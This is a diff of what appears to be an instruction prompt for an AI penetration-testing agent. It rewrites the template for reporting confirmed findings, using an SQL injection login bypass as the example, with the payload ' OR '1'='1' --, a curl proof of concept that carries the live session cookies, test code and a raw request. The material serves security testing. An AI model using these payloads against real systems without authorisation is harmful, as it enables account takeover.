@@ -108,21 +108,58 @@ SCREENSHOT EVIDENCE — VISUAL PROOF FOR CONFIRMED VULNERABILITIES:
   These screenshots are saved in the workspace and included in the final report.
 
 INLINE PRINT PATTERN — every time a finding is confirmed:
-  print("=" * 60)
-  print(f"FINDING: SQL Injection in login form")
-  print(f"Severity: [CRITICAL]")
-  print(f"URL: https://target.com/login")
-  print(f"Method: POST")
-  print(f"Payload: username=' OR '1'='1' --&password=x")
-  print(f"Evidence: {r.text[:300]}")
-  UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-  # If testing with pre-authenticated cookie session, include -b with actual cookies:
-  cookie_flag = ''
+
+  STEP 1 — Print the full finding block to the console (so it's visible):
+
+  print("=" * 70)
+  print(f"[CRITICAL] FINDING: SQL Injection in login form")
+  print(f"URL:      https://target.com/login")
+  print(f"Method:   POST")
+  print(f"Payload:  username=' OR '1'='1' --  |  password=x")
+  print(f"Status:   {r.status_code}  |  Size: {len(r.text)} bytes")
+  print(f"Evidence (full response):")
+  print(r.text[:3000])   # ← print UP TO 3000 chars — show real server output, not a snippet
+  print("-" * 70)
+  # Build curl POC with real cookies and real URL
+  _UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+  _cookie_flag = ''
   if _G.get('session') and _G['session'].cookies:
-      cstr = '; '.join(f'{c.name}={c.value}' for c in _G['session'].cookies)
-      cookie_flag = f' -b "{cstr}"'
-  print(f'curl POC: curl -sk -A "{UA}"{cookie_flag} -X POST "https://target.com/login" -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "username=\' OR \'1\'=\'1\' --" -d "password=x" -L -w "\\nFinal: %{{url_effective}}"')
-  print("=" * 60)
+      _cstr = '; '.join(f'{c.name}={c.value}' for c in _G['session'].cookies)
+      _cookie_flag = f' \\\n  -b "{_cstr}"'
+  _curl_poc = f'''UA="{_UA}"
+curl -sk -A "$UA" -X POST "https://target.com/login"{_cookie_flag} \\
+  -H "Content-Type: application/x-www-form-urlencoded" \\
+  --data-urlencode "username=' OR '1'='1' --" \\
+  -d "password=x" -L -w "\\nFinal URL: %{{url_effective}}"
+# Expected: Final URL: https://target.com/dashboard — authenticated without valid credentials'''
+  print(f"curl POC:\n{_curl_poc}")
+  print("=" * 70)
+
+  STEP 2 — Store the FULL finding in _G['FINDINGS'] (MANDATORY — this populates the report):
+
+  _G.setdefault('FINDINGS', []).append({
+      'severity':      'CRITICAL',
+      'title':         'SQL Injection in login form',
+      'url':           'https://target.com/login',
+      'method':        'POST',
+      'param':         'username',
+      'payload':       "' OR '1'='1' --",
+      'cvss':          '9.8 — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
+      # Full server response — DO NOT TRUNCATE here, truncation happens in the report renderer
+      'evidence':      r.text,
+      # Full request as a curl command so anyone can reproduce it
+      'poc':           _curl_poc,
+      # The exact Python test code that confirmed this (copy from your run_python call)
+      'test_code':     """r = session.post('https://target.com/login',
+    data={'username': "' OR '1'='1' --", 'password': 'x'},
+    allow_redirects=True, verify=False)
+print(r.status_code, r.url)""",
+      # Raw HTTP request details
+      'request':       f"POST /login HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=' OR '1'='1' --&password=x",
+      'response':      r.text,
+      'impact':        'Authentication bypass — attacker can log in as any user without a valid password',
+      'remediation':   'Use parameterised queries / prepared statements. Never concatenate user input into SQL strings.',
+  })
 
 ═══════════════════════════════════════════════════════
   WHAT IS NEVER A FINDING — MEMORISE THIS LIST
